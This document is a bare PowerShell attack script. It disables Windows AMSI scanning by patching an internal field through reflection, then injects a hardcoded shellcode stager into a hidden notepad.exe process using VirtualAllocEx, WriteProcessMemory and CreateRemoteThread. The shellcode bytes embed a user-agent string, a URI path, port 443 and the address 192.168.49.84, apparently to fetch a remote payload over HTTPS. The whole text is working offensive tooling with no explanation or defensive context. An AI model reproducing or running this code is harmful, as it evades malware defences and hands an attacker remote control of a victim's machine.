﻿$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if ($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}


function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

if ((Get-Process -Name "notepad").Id) {
    $notepadId = (Get-Process -Name "notepad").Id
} else {
    Start-Process -FilePath "C:\Windows\SysWOW64\notepad.exe" -WindowStyle Hidden
    $notepadId = (Get-Process -Name "notepad").Id
}

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 (LookupFunc kernel32.dll OpenProcess), 
 (getDelegateType @([UInt32], [bool], [Int32])([IntPtr]))).Invoke(0x001F0FFF, $false, $notepadId)

$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 (LookupFunc kernel32.dll VirtualAllocEx),
 (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $buf.length, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x57,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x58,0x20,0x8b,0x48,0x18,0x50,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0x71,0x1,0x0,0x0,0x2f,0x64,0x73,0x50,0x69,0x5f,0x63,0x67,0x5a,0x51,0x5f,0x64,0x76,0x2d,0x32,0x37,0x36,0x44,0x36,0x31,0x52,0x34,0x51,0x76,0x71,0x47,0x49,0x6a,0x47,0x4c,0x56,0x50,0x72,0x33,0x72,0x51,0x39,0x48,0x32,0x31,0x6d,0x65,0x57,0x49,0x4a,0x35,0x71,0x4e,0x62,0x6f,0x32,0x41,0x34,0x69,0x66,0x50,0x6e,0x33,0x4d,0x74,0x37,0x5a,0x4a,0x46,0x59,0x69,0x6f,0x35,0x4b,0x51,0x75,0x6f,0x75,0x6f,0x47,0x71,0x79,0x70,0x4e,0x33,0x36,0x73,0x4e,0x38,0x72,0x65,0x65,0x30,0x76,0x65,0x58,0x79,0x50,0x47,0x63,0x78,0x55,0x5a,0x77,0x69,0x41,0x5f,0x76,0x53,0x75,0x4a,0x61,0x71,0x49,0x79,0x54,0x6a,0x78,0x33,0x64,0x47,0x6c,0x52,0x44,0x64,0x4a,0x59,0x79,0x6b,0x45,0x57,0x42,0x6e,0x41,0x5a,0x70,0x46,0x61,0x38,0x76,0x5a,0x45,0x36,0x34,0x65,0x42,0x45,0x4e,0x4c,0x68,0x6a,0x33,0x70,0x6f,0x79,0x58,0x74,0x74,0x36,0x6e,0x69,0x74,0x5f,0x67,0x34,0x4a,0x4c,0x32,0x4a,0x65,0x57,0x7a,0x49,0x36,0x56,0x61,0x32,0x50,0x45,0x61,0x69,0x49,0x77,0x54,0x65,0x6b,0x63,0x7a,0x71,0x34,0x77,0x7a,0x6b,0x63,0x71,0x34,0x39,0x70,0x32,0x58,0x43,0x44,0x73,0x75,0x4e,0x38,0x5a,0x4e,0x48,0x35,0x58,0x65,0x31,0x68,0x78,0x79,0x49,0x61,0x39,0x30,0x72,0x74,0x56,0x63,0x37,0x6f,0x4d,0x45,0x65,0x41,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x38,0x34,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 (LookupFunc kernel32.dll WriteProcessMemory),
 (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [UInt32].MakeByRefType())([Bool]))).Invoke($hProcess,$addr,$buf,$buf.Length,[ref] 0)|Out-Null

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 (LookupFunc kernel32.dll CreateRemoteThread),
 (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hProcess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)|Out-Null
